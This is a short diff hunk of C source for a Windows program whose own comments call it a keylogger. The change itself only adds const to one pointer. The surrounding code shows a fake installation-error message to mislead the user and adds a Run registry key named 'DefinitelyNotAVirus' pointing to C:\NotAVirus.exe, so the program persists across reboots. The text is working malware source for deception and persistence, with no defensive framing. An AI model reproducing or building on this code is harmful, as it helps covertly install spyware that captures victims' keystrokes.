@@ -171,7 +171,7 @@ int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int 
     MSG msg;
     MessageBox(NULL, "Something Went Wrong During Installation! Please try again or visit our support page.", "ERROR", MB_ICONWARNING);
     HKEY registryKey = NULL;
-    char* keyloggerPath = "C:\\NotAVirus.exe"; // Path that the keylogger must be at for the registry key stuff to work.
+    const char* keyloggerPath = "C:\\NotAVirus.exe"; // Path that the keylogger must be at for the registry key stuff to work.
     RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &registryKey); // Creating a registry key for the keylogger.
     LONG success = RegSetValueEx(registryKey, "DefinitelyNotAVirus", 0, REG_SZ, (unsigned char *)keyloggerPath, strlen(keyloggerPath)); // Adding the key to the registry.
     if(success == ERROR_SUCCESS)
